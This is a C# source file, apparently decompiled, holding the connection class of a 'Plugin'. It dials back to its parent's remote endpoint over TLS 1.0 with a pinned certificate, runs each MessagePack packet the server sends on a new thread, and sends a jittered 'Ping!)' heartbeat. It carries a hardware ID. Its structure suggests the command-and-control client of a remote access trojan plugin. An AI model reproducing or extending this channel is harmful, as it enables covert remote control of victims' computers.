using System;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using MessagePackLib.MessagePack;

namespace Plugin;

public static class Connection
{
	public static Socket TcpClient { get; set; }

	public static SslStream SslClient { get; set; }

	public static X509Certificate2 ServerCertificate { get; set; }

	private static byte[] Buffer { get; set; }

	private static long HeaderSize { get; set; }

	private static long Offset { get; set; }

	private static Timer Tick { get; set; }

	public static bool IsConnected { get; set; }

	private static object SendSync { get; } = new object();


	public static string Hwid { get; set; }

	public static void InitializeClient(byte[] packet)
	{
		try
		{
			TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
			{
				ReceiveBufferSize = 51200,
				SendBufferSize = 51200
			};
			TcpClient.Connect(Plugin.Socket.RemoteEndPoint!.ToString()!.Split(new char[1] { ':' })[0], Convert.ToInt32(Plugin.Socket.RemoteEndPoint!.ToString()!.Split(new char[1] { ':' })[1]));
			if (TcpClient.Connected)
			{
				IsConnected = true;
				SslClient = new SslStream(new NetworkStream(TcpClient, ownsSocket: true), leaveInnerStreamOpen: false, ValidateServerCertificate);
				SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint!.ToString()!.Split(new char[1] { ':' })[0], null, SslProtocols.Tls, checkCertificateRevocation: false);
				HeaderSize = 4L;
				Buffer = new byte[HeaderSize];
				Offset = 0L;
				Tick = new Timer(CheckServer, null, new Random().Next(15000, 30000), new Random().Next(15000, 30000));
				SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
				new Thread((ThreadStart)delegate
				{
					Packet.Read(packet);
				}).Start();
			}
			else
			{
				Disconnected();
			}
		}
		catch
		{
			IsConnected = false;
		}
	}

	private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
	{
		return ServerCertificate.Equals(certificate);
	}

	public static void Disconnected()
	{
		try
		{
			IsConnected = false;
			Tick?.Dispose();
			SslClient?.Dispose();
			TcpClient?.Dispose();
			GC.Collect();
		}
		catch
		{
		}
	}

	public static void ReadServertData(IAsyncResult ar)
	{
		try
		{
			if (TcpClient.Connected && IsConnected)
			{
				int num = SslClient.EndRead(ar);
				if (num > 0)
				{
					Offset += num;
					HeaderSize -= num;
					if (HeaderSize == 0L)
					{
						HeaderSize = BitConverter.ToInt32(Buffer, 0);
						if (HeaderSize > 0L)
						{
							Offset = 0L;
							Buffer = new byte[HeaderSize];
							while (HeaderSize > 0L)
							{
								int num2 = SslClient.Read(Buffer, (int)Offset, (int)HeaderSize);
								if (num2 > 0)
								{
									Offset += num2;
									HeaderSize -= num2;
									if (HeaderSize < 0L)
									{
										Disconnected();
										return;
									}
									continue;
								}
								Disconnected();
								return;
							}
							new Thread(Packet.Read).Start(Buffer);
							Offset = 0L;
							HeaderSize = 4L;
							Buffer = new byte[HeaderSize];
						}
						else
						{
							HeaderSize = 4L;
							Buffer = new byte[HeaderSize];
							Offset = 0L;
						}
					}
					else if (HeaderSize < 0L)
					{
						Disconnected();
						return;
					}
					SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
				}
				else
				{
					Disconnected();
				}
			}
			else
			{
				Disconnected();
			}
		}
		catch
		{
			Disconnected();
		}
	}

	public static void Send(byte[] msg)
	{
		lock (SendSync)
		{
			try
			{
				if (!IsConnected || msg == null)
				{
					return;
				}
				byte[] bytes = BitConverter.GetBytes(msg.Length);
				TcpClient.Poll(-1, SelectMode.SelectWrite);
				SslClient.Write(bytes, 0, bytes.Length);
				if (msg.Length > 1000000)
				{
					using (MemoryStream memoryStream = new MemoryStream(msg))
					{
						int num = 0;
						memoryStream.Position = 0L;
						byte[] array = new byte[50000];
						while ((num = memoryStream.Read(array, 0, array.Length)) > 0)
						{
							TcpClient.Poll(-1, SelectMode.SelectWrite);
							SslClient.Write(array, 0, num);
						}
						return;
					}
				}
				SslClient.Write(msg, 0, msg.Length);
				SslClient.Flush();
			}
			catch
			{
				IsConnected = false;
			}
		}
	}

	public static void CheckServer(object obj)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "Ping!)";
		Send(msgPack.Encode2Bytes());
		GC.Collect();
	}
}
